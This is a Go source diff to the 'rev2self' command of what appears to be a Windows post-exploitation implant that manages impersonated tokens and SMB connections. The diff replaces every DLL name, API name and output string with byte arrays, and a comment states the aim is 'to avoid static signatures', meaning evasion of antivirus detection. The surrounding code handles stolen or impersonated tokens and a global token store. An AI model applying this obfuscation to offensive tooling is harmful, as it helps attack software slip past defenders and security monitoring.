@@ -5,7 +5,7 @@
 package main
 
 import (
-	"fmt"
+	"strconv"
 	"strings"
 	"sync"
 	"syscall"
@@ -13,19 +13,66 @@ import (
 	"unsafe"
 )
 
+// Rev2self strings (constructed to avoid static signatures)
 var (
-	modmpr                    = syscall.NewLazyDLL("mpr.dll")
-	procWNetCancelConnection2 = modmpr.NewProc("WNetCancelConnection2W")
-	procWNetOpenEnum          = modmpr.NewProc("WNetOpenEnumW")
-	procWNetEnumResource      = modmpr.NewProc("WNetEnumResourceW")
-	procWNetCloseEnum         = modmpr.NewProc("WNetCloseEnum")
-	procWNetGetConnection     = modmpr.NewProc("WNetGetConnectionW")
+	// DLL/API names
+	r2sMprDll             = string([]byte{0x6d, 0x70, 0x72, 0x2e, 0x64, 0x6c, 0x6c})                                                                                                 // mpr.dll
+	r2sWNetCancelConn2    = string([]byte{0x57, 0x4e, 0x65, 0x74, 0x43, 0x61, 0x6e, 0x63, 0x65, 0x6c, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x32, 0x57})       // WNetCancelConnection2W
+	r2sWNetOpenEnum       = string([]byte{0x57, 0x4e, 0x65, 0x74, 0x4f, 0x70, 0x65, 0x6e, 0x45, 0x6e, 0x75, 0x6d, 0x57})                                                             // WNetOpenEnumW
+	r2sWNetEnumResource   = string([]byte{0x57, 0x4e, 0x65, 0x74, 0x45, 0x6e, 0x75, 0x6d, 0x52, 0x65, 0x73, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x57})                                     // WNetEnumResourceW
+	r2sWNetCloseEnum      = string([]byte{0x57, 0x4e, 0x65, 0x74, 0x43, 0x6c, 0x6f, 0x73, 0x65, 0x45, 0x6e, 0x75, 0x6d})                                                             // WNetCloseEnum
+	r2sWNetGetConn        = string([]byte{0x57, 0x4e, 0x65, 0x74, 0x47, 0x65, 0x74, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x57})                               // WNetGetConnectionW
+
+	// Path strings
+	r2sUncPrefix    = string([]byte{0x5c, 0x5c})                         // \\
+	r2sBackslash    = string([]byte{0x5c})                               // \
+	r2sIpcSuffix    = string([]byte{0x5c, 0x49, 0x50, 0x43, 0x24})       // \IPC$
+
+	// Command/argument strings
+	r2sCmdName = string([]byte{0x72, 0x65, 0x76, 0x32, 0x73, 0x65, 0x6c, 0x66}) // rev2self
+	r2sArgAll  = string([]byte{0x2f, 0x61, 0x6c, 0x6c})                         // /all
+
+	// Output strings
+	r2sUnknown       = string([]byte{0x55, 0x6e, 0x6b, 0x6e, 0x6f, 0x77, 0x6e})                                                                                                                                                                                                                                                                                     // Unknown
+	r2sNewline       = string([]byte{0x0a})                                                                                                                                                                                                                                                                                                                         // \n
+	r2sNoImperson    = string([]byte{0x4e, 0x6f, 0x20, 0x61, 0x63, 0x74, 0x69, 0x76, 0x65, 0x20, 0x69, 0x6d, 0x70, 0x65, 0x72, 0x73, 0x6f, 0x6e, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x64, 0x65, 0x74, 0x65, 0x63, 0x74, 0x65, 0x64})                                                                                                                               // No active impersonation detected
+	r2sCurUser       = string([]byte{0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x20, 0x75, 0x73, 0x65, 0x72, 0x3a, 0x20})                                                                                                                                                                                                                                           // Current user:
+	r2sImpReverted   = string([]byte{0x0a, 0x20, 0x20, 0x20, 0x20, 0x49, 0x6d, 0x70, 0x65, 0x72, 0x73, 0x6f, 0x6e, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x72, 0x65, 0x76, 0x65, 0x72, 0x74, 0x65, 0x64, 0x3a, 0x0a})                                                                                                                                                 // \n    Impersonation reverted:\n
+	r2sWas           = string([]byte{0x20, 0x20, 0x20, 0x20, 0x57, 0x61, 0x73, 0x3a, 0x20})                                                                                                                                                                                                                                                                         //     Was:
+	r2sNow           = string([]byte{0x20, 0x20, 0x20, 0x20, 0x4e, 0x6f, 0x77, 0x3a, 0x20})                                                                                                                                                                                                                                                                         //     Now:
+	r2sNetOnlyClr    = string([]byte{0x0a, 0x20, 0x20, 0x20, 0x20, 0x4e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b, 0x2d, 0x6f, 0x6e, 0x6c, 0x79, 0x20, 0x74, 0x6f, 0x6b, 0x65, 0x6e, 0x20, 0x63, 0x6c, 0x65, 0x61, 0x72, 0x65, 0x64, 0x3a, 0x20})                                                                                                                         // \n    Network-only token cleared:
+	r2sDisconnected  = string([]byte{0x0a, 0x20, 0x20, 0x20, 0x20, 0x44, 0x69, 0x73, 0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20})                                                                                                                                                                                                                   // \n    Disconnected
+	r2sNetConns      = string([]byte{0x20, 0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b, 0x20, 0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x28, 0x73, 0x29, 0x0a})                                                                                                                                                                                     //  network connection(s)\n
+	r2sSharePrefix   = string([]byte{0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x2d, 0x20})                                                                                                                                                                                                                                                                               //       -
+	r2sAndMore       = string([]byte{0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x2e, 0x2e, 0x2e, 0x20, 0x61, 0x6e, 0x64, 0x20})                                                                                                                                                                                                                                           //       ... and
+	r2sMore          = string([]byte{0x20, 0x6d, 0x6f, 0x72, 0x65, 0x0a})                                                                                                                                                                                                                                                                                           //  more\n
+	r2sNoNetConns    = string([]byte{0x0a, 0x20, 0x20, 0x20, 0x20, 0x4e, 0x6f, 0x74, 0x65, 0x3a, 0x20, 0x4e, 0x6f, 0x20, 0x61, 0x63, 0x74, 0x69, 0x76, 0x65, 0x20, 0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b, 0x20, 0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x20, 0x66, 0x6f, 0x75, 0x6e, 0x64, 0x20, 0x74, 0x6f, 0x20, 0x64, 0x69, 0x73, 0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x0a}) // \n    Note: No active network connections found to disconnect\n
+	r2sSmbCache      = string([]byte{0x20, 0x20, 0x20, 0x20, 0x28, 0x53, 0x4d, 0x42, 0x20, 0x63, 0x61, 0x63, 0x68, 0x65, 0x20, 0x6d, 0x61, 0x79, 0x20, 0x73, 0x74, 0x69, 0x6c, 0x6c, 0x20, 0x61, 0x6c, 0x6c, 0x6f, 0x77, 0x20, 0x6f, 0x6e, 0x65, 0x20, 0x6d, 0x6f, 0x72, 0x65, 0x20, 0x61, 0x63, 0x63, 0x65, 0x73, 0x73, 0x29, 0x0a})                               //     (SMB cache may still allow one more access)\n
+	r2sTokensStored  = string([]byte{0x0a})                                                                                                                                                                                                                                                                                                                         // \n
+	r2sTokensSuffix  = string([]byte{0x20, 0x74, 0x6f, 0x6b, 0x65, 0x6e, 0x28, 0x73, 0x29, 0x20, 0x73, 0x74, 0x6f, 0x72, 0x65, 0x64})                                                                                                                                                                                                                               //  token(s) stored
+
+	// Lazy DLL/proc variables (initialized in init)
+	modmpr                    *syscall.LazyDLL
+	procWNetCancelConnection2 *syscall.LazyProc
+	procWNetOpenEnum          *syscall.LazyProc
+	procWNetEnumResource      *syscall.LazyProc
+	procWNetCloseEnum         *syscall.LazyProc
+	procWNetGetConnection     *syscall.LazyProc
 
 	// Track network resources accessed with network-only tokens
 	networkResourceTracker = &NetworkResourceTracker{
 		resources: make(map[string]bool),
 	}
 )
+
+func init() {
+	modmpr = syscall.NewLazyDLL(r2sMprDll)
+	procWNetCancelConnection2 = modmpr.NewProc(r2sWNetCancelConn2)
+	procWNetOpenEnum = modmpr.NewProc(r2sWNetOpenEnum)
+	procWNetEnumResource = modmpr.NewProc(r2sWNetEnumResource)
+	procWNetCloseEnum = modmpr.NewProc(r2sWNetCloseEnum)
+	procWNetGetConnection = modmpr.NewProc(r2sWNetGetConn)
+}
 
 // Windows constants for WNet functions
 const (
@@ -71,7 +118,7 @@ type NetworkResourceTracker struct {
 
 // TrackNetworkResource adds a network path to the tracker
 func (nrt *NetworkResourceTracker) TrackNetworkResource(path string) {
-	if !strings.HasPrefix(path, "\\\\") {
+	if !strings.HasPrefix(path, r2sUncPrefix) {
 		return
 	}
 
@@ -80,15 +127,15 @@ func (nrt *NetworkResourceTracker) TrackNetworkResource(path string) {
 
 	// Extract the server/share from the path
 	// e.g., \\server\share\folder\file -> \\server\share
-	parts := strings.Split(path[2:], "\\")
+	parts := strings.Split(path[2:], r2sBackslash)
 	if len(parts) >= 2 {
-		resource := "\\\\" + parts[0] + "\\" + parts[1]
+		resource := r2sUncPrefix + parts[0] + r2sBackslash + parts[1]
 		if !nrt.resources[resource] {
 			nrt.resources[resource] = true
 		}
 	} else if len(parts) >= 1 {
 		// Just server, track IPC$ connection
-		resource := "\\\\" + parts[0] + "\\IPC$"
+		resource := r2sUncPrefix + parts[0] + r2sIpcSuffix
 		if !nrt.resources[resource] {
 			nrt.resources[resource] = true
 		}
@@ -195,7 +242,7 @@ func EnumerateNetworkConnections() []string {
 			// Get the remote name
 			if nr.RemoteName != nil {
 				remoteName := syscall.UTF16ToString((*[1024]uint16)(unsafe.Pointer(nr.RemoteName))[:])
-				if strings.HasPrefix(remoteName, "\\\\") {
+				if strings.HasPrefix(remoteName, r2sUncPrefix) {
 					connections = append(connections, remoteName)
 				}
 			}
@@ -230,11 +277,11 @@ func DisconnectTrackedNetworkResources() []string {
 		}
 
 		// Try the IPC$ share specifically
-		if !strings.HasSuffix(resource, "\\IPC$") {
+		if !strings.HasSuffix(resource, r2sIpcSuffix) {
 			// Extract server name and try IPC$
-			if idx := strings.Index(resource[2:], "\\"); idx > 0 {
+			if idx := strings.Index(resource[2:], r2sBackslash); idx > 0 {
 				server := resource[:idx+2]
-				ipcPath := server + "\\IPC$"
+				ipcPath := server + r2sIpcSuffix
 				err = WNetCancelConnection2(ipcPath, 0, true)
 				if err == nil {
 				}
@@ -269,7 +316,7 @@ func DisconnectAllNetworkConnections() []string {
 type Rev2SelfCommand struct{}
 
 func (c *Rev2SelfCommand) Name() string {
-	return "rev2self"
+	return r2sCmdName
 }
 
 func (c *Rev2SelfCommand) Execute(ctx *CommandContext, args []string) CommandResult {
@@ -298,7 +345,7 @@ func (c *Rev2SelfCommand) Execute(ctx *CommandContext, args []string) CommandRes
 		disconnectedShares = DisconnectTrackedNetworkResources()
 
 		// If requested or no tracked resources, disconnect all
-		if len(args) > 0 && args[0] == "/all" {
+		if len(args) > 0 && args[0] == r2sArgAll {
 			// User explicitly wants to disconnect all
 			allDisconnected := DisconnectAllNetworkConnections()
 			for _, share := range allDisconnected {
@@ -365,37 +412,36 @@ func (c *Rev2SelfCommand) Execute(ctx *CommandContext, args []string) CommandRes
 	// Build output
 	var output string
 	if beforeUser == afterUser && beforeDomain == afterDomain && !hadNetOnlyToken {
-		output = fmt.Sprintf("No active impersonation detected\nCurrent user: %s\\%s",
-			afterDomain, afterUser)
+		output = r2sNoImperson + r2sNewline + r2sCurUser + afterDomain + r2sBackslash + afterUser
 	} else {
-		output = Succ(S14) + "\n"
+		output = Succ(S14) + r2sNewline
 
 		// Report on regular impersonation if it was active
 		if beforeUser != afterUser || beforeDomain != afterDomain {
-			output += fmt.Sprintf("\n    Impersonation reverted:\n")
-			output += fmt.Sprintf("    Was: %s\\%s\n", beforeDomain, beforeUser)
-			output += fmt.Sprintf("    Now: %s\\%s\n", afterDomain, afterUser)
+			output += r2sImpReverted
+			output += r2sWas + beforeDomain + r2sBackslash + beforeUser + r2sNewline
+			output += r2sNow + afterDomain + r2sBackslash + afterUser + r2sNewline
 		}
 
 		// Report on network-only token if it was active
 		if hadNetOnlyToken {
-			output += fmt.Sprintf("\n    Network-only token cleared: %s\n", netOnlyTokenName)
+			output += r2sNetOnlyClr + netOnlyTokenName + r2sNewline
 
 			// Report disconnected shares if any
 			if len(disconnectedShares) > 0 {
-				output += fmt.Sprintf("\n    Disconnected %d network connection(s)\n", len(disconnectedShares))
+				output += r2sDisconnected + strconv.Itoa(len(disconnectedShares)) + r2sNetConns
 				// Show disconnected resources
 				for i, share := range disconnectedShares {
 					if i < 5 {
-						output += fmt.Sprintf("      - %s\n", share)
+						output += r2sSharePrefix + share + r2sNewline
 					}
 				}
 				if len(disconnectedShares) > 5 {
-					output += fmt.Sprintf("      ... and %d more\n", len(disconnectedShares)-5)
+					output += r2sAndMore + strconv.Itoa(len(disconnectedShares)-5) + r2sMore
 				}
 			} else if hadNetOnlyToken {
-				output += "\n    Note: No active network connections found to disconnect\n"
-				output += "    (SMB cache may still allow one more access)\n"
+				output += r2sNoNetConns
+				output += r2sSmbCache
 			}
 		}
 	}
@@ -407,7 +453,7 @@ func (c *Rev2SelfCommand) Execute(ctx *CommandContext, args []string) CommandRes
 		globalTokenStore.mu.RUnlock()
 
 		if tokenCount > 0 {
-			output += fmt.Sprintf("\n%d token(s) stored", tokenCount)
+			output += r2sTokensStored + strconv.Itoa(tokenCount) + r2sTokensSuffix
 		}
 	}
 
@@ -435,7 +481,7 @@ func (c *Rev2SelfCommand) getCurrentUserInfo() (string, string) {
 		return c.getTokenUserInfo(syscall.Handle(token))
 	}
 
-	return "Unknown", "Unknown"
+	return r2sUnknown, r2sUnknown
 }
 
 func (c *Rev2SelfCommand) getTokenUserInfo(token syscall.Handle) (string, string) {
@@ -449,7 +495,7 @@ func (c *Rev2SelfCommand) getTokenUserInfo(token syscall.Handle) (string, string
 	)
 
 	if needed == 0 {
-		return "Unknown", ""
+		return r2sUnknown, ""
 	}
 
 	buffer := make([]byte, needed)
@@ -462,7 +508,7 @@ func (c *Rev2SelfCommand) getTokenUserInfo(token syscall.Handle) (string, string
 	)
 
 	if ret == 0 {
-		return "Unknown", ""
+		return r2sUnknown, ""
 	}
 
 	tokenUser := (*TokenUser)(unsafe.Pointer(&buffer[0]))
@@ -483,7 +529,7 @@ func (c *Rev2SelfCommand) getTokenUserInfo(token syscall.Handle) (string, string
 	)
 
 	if ret == 0 {
-		return "Unknown", ""
+		return r2sUnknown, ""
 	}
 
 	return syscall.UTF16ToString(nameBuffer), syscall.UTF16ToString(domainBuffer)
